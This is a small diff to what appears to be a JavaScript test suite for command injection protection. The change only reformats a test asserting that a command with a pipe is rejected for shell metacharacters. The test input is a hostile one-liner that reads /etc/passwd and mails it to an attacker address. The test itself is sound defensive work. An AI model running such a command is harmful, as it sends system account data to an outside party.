@@ -15,7 +15,9 @@ describe('Command Injection Protection', () => {
 
     it('should reject commands with pipe', async () => {
       try {
-        await execute_command({ command: 'cat /etc/passwd | mail attacker@evil.com' })
+        await execute_command({
+          command: 'cat /etc/passwd | mail attacker@evil.com'
+        })
         expect.fail('Should have thrown an error')
       } catch (error) {
         expect(error.message).to.include('shell metacharacters')
